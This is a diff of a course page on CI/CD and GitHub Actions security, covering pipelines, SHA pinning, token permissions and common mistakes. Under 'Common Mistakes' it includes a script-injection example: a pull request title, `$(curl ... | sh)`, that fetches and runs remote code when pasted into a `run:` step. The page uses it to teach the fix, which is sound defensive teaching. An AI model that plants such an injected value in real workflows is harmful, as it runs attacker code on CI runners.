@@ -12,7 +12,7 @@ import TrackLink from '../../../../components/TrackLink.astro';
 
 <UsedInWeeks />
 
-CI/CD is the habit, and the machinery, that takes every change from a commit to a running program through the same automated checks. Without it, the checks run only when someone remembers them, and a release depends on whoever builds it on their laptop that day. As a full-stack engineer, you write the pipeline as much as the code it ships: a broken workflow blocks every pull request, and a careless one hands your secrets to strangers.
+Continuous integration and continuous delivery, CI/CD for short, is the habit, and the machinery, that takes every change from a commit to a running program through the same automated checks. Without it, the checks run only when someone remembers them, and a release depends on whoever builds it on their laptop that day. As a full-stack engineer, you write the pipeline as much as the code it ships: a broken workflow blocks every pull request, and a careless one hands your secrets to strangers.
 
 ## What It Is
 
@@ -56,11 +56,11 @@ A **pipeline** is the ordered set of stages a commit passes through: check, buil
 Two rules keep a pipeline honest:
 
 - **Build once, deploy that build everywhere.** The image you test in staging is the same image, byte for byte, that reaches production. A pipeline that rebuilds per environment deploys bytes nobody tested: a base image or a dependency can change between the two builds.
-- **Name the artifact after the commit.** A tag such as `latest` moves with every build and says nothing about the code inside. A tag made of the commit SHA, the 40-character hash Git computes from a commit, names one exact source tree. It answers which code an image holds, and which image to roll back to.
+- **Name the artifact after the commit.** A tag such as `latest` moves with every build and says nothing about the code inside. A tag made of the commit SHA, named after the Secure Hash Algorithm: the 40-character hash Git computes from a commit, names one exact source tree. It answers which code an image holds, and which image to roll back to.
 
 ### GitHub Actions in Brief
 
-GitHub Actions is the CI service built into GitHub. A **workflow** is a YAML file in `.github/workflows/`. An **event**, such as `pull_request` or `push`, starts it. A workflow holds **jobs**, and each job runs its **steps** on a **runner**, a fresh virtual machine that GitHub creates for the job and deletes after it. A step runs a shell script with `run:`, or calls an **action** with `uses:`: a packaged step that someone publishes in a Git repository. Jobs run side by side unless `needs:` makes one wait for another. <WeekLink n={14} anchor="the-parts-of-github-actions">The Parts of GitHub Actions in Week 14</WeekLink> covers the rest of the vocabulary, including contexts and expressions.
+GitHub Actions is the CI service built into GitHub. A **workflow** is a file in `.github/workflows/`, written in YAML, the structured text format of most CI and Kubernetes configuration. An **event**, such as `pull_request` or `push`, starts it. A workflow holds **jobs**, and each job runs its **steps** on a **runner**, a fresh virtual machine that GitHub creates for the job and deletes after it. A step runs a shell script with `run:`, or calls an **action** with `uses:`: a packaged step that someone publishes in a Git repository. Jobs run side by side unless `needs:` makes one wait for another. <WeekLink n={14} anchor="the-parts-of-github-actions">The Parts of GitHub Actions in Week 14</WeekLink> covers the rest of the vocabulary, including contexts and expressions.
 
 ### The Token, the Pins and the Secrets
 
@@ -112,7 +112,7 @@ stg -> prod: promote
   ]}
 />
 
-The workflow on this page covers the first three stages for a pull request. Its two jobs, and what each one can touch:
+The workflow on this page covers the first two stages, for a pull request. Its two jobs, and what each one can touch:
 
 <Diagram
   id="ci-jobs"
@@ -158,8 +158,8 @@ GitHub Actions does not run on your laptop, and a typo in a workflow shows up on
 
 <CodeFrom file="go/tracks/cicd/ci_test.go" region="checks" lang="go" title="ci_test.go" />
 
-- `pinned`: accepts a tag that starts with `v` and a digit, or a 40-character SHA. It rejects a branch such as `@main`, and a short SHA: only the full 40 characters name one commit for certain.
-- `readOnly`: walks the `permissions:` mapping and reports any scope other than `read` or `none`. A missing block fails at the workflow level, because the token then falls back to the repository default.
+- `pins`: walks the YAML tree and checks every `uses:` value against `pinned`, which accepts only a full 40-character SHA. It rejects a tag such as `@v7`, a branch such as `@main`, and a short SHA: only the full 40 characters name one commit for certain. The comment on the same line must name the release, such as `# v7.0.1`, and the YAML parser keeps that comment on the value it belongs to.
+- `readOnly`: accepts `read-all`, or walks the `permissions:` mapping and reports any scope other than `read` or `none`. A missing block fails at the workflow level, because the token then falls back to the repository default.
 - `problems`: collects every broken rule, including a missing `needs: test` and a test job without `go test -race ./...`.
 
 <CodeFrom file="go/tracks/cicd/ci_test.go" region="test" lang="go" title="ci_test.go" />
@@ -168,16 +168,16 @@ A check that passes everything proves nothing. `TestChecksCatchMistakes` in the 
 
 ## In the Uptime Monitor
 
-<WeekLink n={14} anchor="ci-and-cd">CI and CD in Week 14</WeekLink> turns `make ci` into a GitHub Actions workflow with four check jobs, lint, test, web and e2e, on every pull request and every push to `main`. The test job starts Postgres 17 as a service container, and GitHub sets `CI=true`, which makes the database tests fail instead of skip when the database is missing.
+<WeekLink n={14} anchor="ci-and-cd">CI and CD in Week 14</WeekLink> turns `make ci` into a GitHub Actions workflow with four check jobs, `lint`, `test`, `web` and `e2e`, on every pull request and every push to `main`. The test job starts Postgres 17 as a service container, and GitHub sets `CI=true`, which makes the database tests fail instead of skip when the database is missing.
 
 <WeekLink n={14} anchor="tokens-permissions-and-secrets">Tokens, Permissions and Secrets in Week 14</WeekLink> gives every job `contents: read` and adds `packages: write` to the images job alone. <WeekLink n={14} anchor="step-8-push-the-images">Step 8 of Week 14</WeekLink> builds one image per program after a merge to `main`, tags each with the commit SHA, and pushes it to the GitHub Container Registry. That job is the build-once rule of this page.
 
-<WeekLink n={14} anchor="step-9-write-the-deploy-workflow">Step 9 of Week 14</WeekLink> writes `deploy.yml`, the manual deploy: continuous delivery, with a person at the gate. <WeekLink n={16} anchor="step-12-deploy-to-staging-and-then-to-production">Step 12 of Week 16</WeekLink> runs it against staging and then production on the VPS, and <WeekLink n={17} anchor="rolling-updates-and-rollbacks">Rolling Updates and Rollbacks in Week 17</WeekLink> runs it again with the SHA of the last good commit to make a rollback stick.
+<WeekLink n={14} anchor="step-9-write-the-deploy-workflow">Step 9 of Week 14</WeekLink> writes `deploy.yml`, the manual deploy: continuous delivery, with a person at the gate. <WeekLink n={16} anchor="step-12-deploy-to-staging-and-then-to-production">Step 12 of Week 16</WeekLink> runs it against staging and then production on the virtual private server, and <WeekLink n={17} anchor="rolling-updates-and-rollbacks">Rolling Updates and Rollbacks in Week 17</WeekLink> runs it again with the SHA of the last good commit to make a rollback stick.
 
 ## Common Mistakes
 
 - **No `permissions:` block.** In an older repository, every job then holds a token that can push commits and packages, and one hostile test dependency uses it. Write `contents: read` at the top of every workflow.
-- **An action pinned to a branch or a tag.** `@main` and `@v7` run whatever the action owner, or whoever steals their credentials, points them at next. Pin a full SHA with the release in a comment, and read the SHA from the action repository with `git ls-remote`, never from a blog post or an AI answer.
+- **An action pinned to a branch or a tag.** `@main` and `@v7` run whatever the action owner, or whoever steals their credentials, points them at next. Pin a full SHA with the release in a comment, and read the SHA from the action repository with `git ls-remote`, never from a blog post or a chatbot answer.
 - **An expression inside a `run:` script.** GitHub pastes `${{ github.event.pull_request.title }}` into the script text before bash reads it, and a pull request titled `$(curl https://example.com/x | sh)` runs as code. Pass the value through `env:` and quote the variable in the script.
 - **`pull_request_target` with a checkout of the pull request code.** That event runs with your secrets and a write token, for pull requests from forks too. A workflow that checks out and builds the fork code there hands both to a stranger. Use `pull_request` for anything that runs the code under review.
 - **A rebuild per environment.** Staging tests one build and production runs another, made minutes later from a base image that moved in between. Build once, tag with the SHA, and promote that tag.
@@ -188,11 +188,11 @@ A check that passes everything proves nothing. `TestChecksCatchMistakes` in the 
 
 - **Reusable workflows and composite actions:** one definition of the checks, called from every repository you own, instead of copies that drift apart.
 - **OpenID Connect for deploys:** GitHub issues the job a signed identity token, and a cloud provider trades it for short-lived credentials, which removes the long-lived cloud secret from the repository.
-- **Build provenance and SLSA:** a signed statement of which workflow built which artifact from which commit, which a cluster can check before it runs an image.
+- **Build provenance and SLSA, Supply-chain Levels for Software Artifacts:** a signed statement of which workflow built which artifact from which commit, which a cluster can check before it runs an image.
 - **Merge queues:** GitHub tests each pull request on top of the ones queued before it, which catches two changes that pass alone and break together.
 - **GitOps with Argo CD or Flux:** the cluster pulls its desired state from a Git repository, and a deploy becomes a commit, reviewed like any other.
 - **Progressive delivery:** canary releases and feature flags expose a change to a small share of traffic first, which turns a bad deploy into a small incident.
-- **DORA metrics:** deployment frequency, lead time for changes, change failure rate and recovery time measure how well a team ships, with research behind each one.
+- **DORA metrics:** DevOps Research and Assessment, DORA, a research program on software delivery, measures how well a team ships with deployment frequency, lead time for changes, change failure rate and recovery time.
 
 ## Further Reading
 
@@ -200,4 +200,4 @@ A check that passes everything proves nothing. `TestChecksCatchMistakes` in the 
 - [Secure use reference for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use): the GitHub guidance on script injection, pinning actions to a full-length SHA and token scopes.
 - [Continuous Integration by Martin Fowler](https://martinfowler.com/articles/continuousIntegration.html): the article that made the practice widely known, revised in 2024, with the habits that make it work.
 - [Continuous Delivery](https://continuousdelivery.com/): Jez Humble on deployment pipelines, the principles behind them and the difference from continuous deployment.
-- [SLSA](https://slsa.dev/): the supply chain levels for software artifacts, a framework for proving where a build comes from.
+- [SLSA](https://slsa.dev/): the SLSA specification, a framework for proving where a build comes from, level by level.
